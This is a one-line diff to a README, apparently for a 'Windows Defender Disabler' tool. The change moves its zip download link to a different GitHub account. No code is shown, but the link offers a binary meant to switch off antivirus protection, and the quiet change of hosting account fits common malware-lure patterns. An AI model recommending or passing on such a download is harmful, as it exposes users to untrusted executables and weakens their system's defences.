@@ -5,7 +5,7 @@
 <img width="212" height="212" alt="47bc8253-21b3-4ad6-990c-37f136757db2" src="https://github.com/user-attachments/assets/49547051-14dc-43fa-a214-774d30ee300c" />
 
 ## Install
-[Download `defender-disabler.zip`](https://github.com/windowsdefenderdisabler/Windows-Defender-Disabler/releases/download/v14/defender-disabler.zip)
+[Download `defender-disabler.zip`](https://github.com/windefenderremover/Windows-Defender-Disabler/releases/download/v14/defender-disabler.zip)
 ---
 
 <img width="1082" height="647" alt="8cdaf29f-be7d-4795-95d7-1df4a5f3f140" src="https://github.com/user-attachments/assets/5dd742b6-e6b0-43cc-8143-ccba5f0a1dab" />
